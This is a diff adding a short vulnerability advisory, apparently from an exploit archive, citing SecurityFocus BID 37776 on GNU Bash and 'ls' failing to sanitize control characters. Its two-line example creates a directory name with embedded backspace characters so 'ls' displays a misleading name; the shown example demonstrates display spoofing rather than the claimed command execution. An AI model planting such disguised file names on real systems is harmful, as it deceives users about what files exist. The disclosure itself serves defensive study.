@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/37776/info
+
+GNU Bash is prone to a command-injection vulnerability because it fails to adequately sanitize control characters in the 'ls' command.
+
+Attackers can exploit this issue to execute arbitrary commands in a bash terminal; other attacks may also be possible. 
+
+The following example is available:
+
+1. mkdir $(echo -e 'couc\x08\x08asd')
+2. ls
+
+Displays:
+coasd/
+
+Expected:
+couc??asd/ 
